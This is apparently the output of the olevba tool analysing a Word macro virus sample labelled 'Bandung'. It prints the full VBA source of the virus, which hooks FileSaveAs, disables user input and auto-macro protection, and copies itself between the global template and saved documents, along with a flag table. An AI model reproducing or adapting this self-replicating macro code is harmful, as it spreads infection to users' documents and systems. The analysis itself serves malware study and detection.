olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bandung-87258bcfc7ca00515e62b9bb686981c8286134a6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bandung-87258bcfc7ca00515e62b9bb686981c8286134a6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Bandung-87258bcfc7ca00515e62b9bb686981c8286134a6 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim FileBaru$, FileMacro$
Dim salah

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file "
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
FileBaru$ = ""
FileMacro$ = ""
salah = 0
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
On Error GoTo -1: On Error GoTo finish
FileMacro$ = WordBasic.[MacroFileName$]()
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
FileBaru$ = WordBasic.[FileName$]()
CopyToFile
If salah <> 0 Then CopyToGlobal
Aksi
WordBasic.FileSaveAs dlg
finish:
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyAOF
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSaveAs", FileBaru$ + ":FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyToGlobal()
On Error GoTo -1: On Error GoTo fin
CopyAOtoG
WordBasic.MacroCopy FileMacro$ + ":FileSaveAs", "Global:FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyAOtoG()
On Error GoTo -1: On Error GoTo finish
WordBasic.MacroCopy FileMacro$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyAOF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSave", FileBaru$ + ":AutoOpen", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT"
WordBasic.SetDocumentVar "Dzutaqshiri", "(c)Hikmat Sudrajat, Bandung, April 1996"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Bandung-87258bcfc7ca00515e62b9bb686981c8286134a6 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

